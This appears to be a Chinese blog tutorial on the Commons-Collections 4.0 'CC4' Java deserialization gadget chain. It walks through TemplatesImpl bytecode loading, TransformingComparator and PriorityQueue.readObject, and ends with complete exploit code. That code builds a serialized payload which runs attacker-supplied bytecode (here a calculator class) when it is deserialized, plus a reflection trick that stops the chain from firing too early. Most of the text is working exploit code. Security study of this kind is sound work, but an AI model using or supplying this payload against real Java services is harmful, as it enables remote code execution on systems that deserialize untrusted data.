---
title: Commons-Collections篇05-CC4链
date: 2025-9-28 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

## 环境搭建

- [JDK8u65](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)
- [openJDK 8u65](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)
- Maven 3.6.3
- Commons-Collections 4.0
- pom.xml加载Commons-Collections 依赖

```xml
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```



## 调用链

![image-20250929135851889](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250929135851889.png)

### Templateslmpl加载字节码

先写出Templateslmpl动态加载字节码的链子

```java
package org.example;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CC4 {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());
 		templates.newTransformer();     
    }
    public static void setfieldvalue(Object object, String fieldname, Object value) throws Exception
    {
        Field field = object.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(object,value);
    }
}
```

这里写过的`setfieldvalue`函数后面就不再重复贴上来了

### TransformingComparator.compare()调用transformer()

然后往前找，`TransformingComparator.compare()`调用`transformer()`

![image-20250928145422184](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928145422184.png)

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());

       InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        TransformingComparator transformingComparator = new TransformingComparator(instantiateTransformer,null);
        transformingComparator.compare(TrAXFilter.class,TrAXFilter.class);
```

## PriorityQueue类完成后续链子

后续的链子都在同一个类中

### PriorityQueue内部调用链

![image-20250928161305133](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928161305133.png)



`PriorityQueue`中的`siftDownUsingComparator`调用了`compare`

![image-20250928150212771](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928150212771.png)

同名类下的`SiftDown`调用了`siftDownUsingComparator`

![image-20250928160210491](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928160210491.png)

同名类下的`heapify`调用了`siftDown`,

![image-20250928160156545](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928160156545.png)

这里要注意size的值，满足条件才会进入for循环，`size>>>1`就是正数除以二的意思

![image-20250928160302684](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928160302684.png)

size是其中的元素数量，所以添加几个数值即可

```java
        priorityQueue.add(1);
        priorityQueue.add(2);
```

同名类下的`readObject`调用了`heapify`

![image-20250928160147137](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928160147137.png)

后续的链子所有步骤都在`PriorityQueue`中执行，只要满足每个函数的条件，直接反序列化就可以调用整条链

其中增加了通过`ConstantTransformer`方法控制最后要执行的类

实例化`PriorityQueue`对象，并且添加了两个元素来满足上面提到的`size`的需求

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
         setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());


       InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(1,transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);
```

没有序列化和反序列化，直接运行代码也可以命令执行

### debug

接下来看add函数，在运行add函数的时候就已经执行`compare`函数了

刚进入这个类找`compare`函数时就可以找到多个地方调用了`compare`，所以出现问题很容易想到是`add`调用了`compare`函数

![image-20250928161513481](Commons-Collections%E7%AF%8705-CC4%E9%93%BE/image-20250928161513481.png)

修改方法也很简单，在调用add之前，无法完整的调用整个链子，在add之后再将链子补充完整即可

最终调用的是`TransformingComparator`类中的`compare`函数，所以将`TransformingComparator`实例化时无法调用整个链子，再add之后再将`TransformingComparator`实例化的值改回来

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
         setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());

//        templates.newTransformer();

       InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
//       instantiateTransformer.transform(TrAXFilter.class);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

//先给一个不能调用链子的值
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
//        transformingComparator.compare(TrAXFilter.class,TrAXFilter.class);
        PriorityQueue priorityQueue = new PriorityQueue(1,transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

//通过反射将值改回来
        Class tscomparator = transformingComparator.getClass();
        Field transformerField = tscomparator.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator,chainedTransformer);        
        serialize(priorityQueue);
        unserialize("CC4.txt");
```

## 完整代码

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import jdk.nashorn.internal.objects.annotations.Constructor;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import sun.text.resources.no.CollationData_no;

import javax.xml.transform.Templates;


import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
         setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());

//        templates.newTransformer();

       InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
//       instantiateTransformer.transform(TrAXFilter.class);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
//        transformingComparator.compare(TrAXFilter.class,TrAXFilter.class);
        PriorityQueue priorityQueue = new PriorityQueue(1,transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class tscomparator = transformingComparator.getClass();
        Field transformerField = tscomparator.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator,chainedTransformer);

//        Class priorityQueueClass = PriorityQueue.class;
//        Method siftUpUsingComparator =  priorityQueueClass.getDeclaredMethod("siftDownUsingComparator",new Class[]{int.class,int.class});
        serialize(priorityQueue);
        unserialize("CC4.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CC4.txt"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws Exception{
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = objectInputStream.readObject();
        return obj;
    }
    public static void setfieldvalue(Object object, String fieldname, Object value) throws Exception
    {
        Field field = object.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(object,value);
    }
}
```

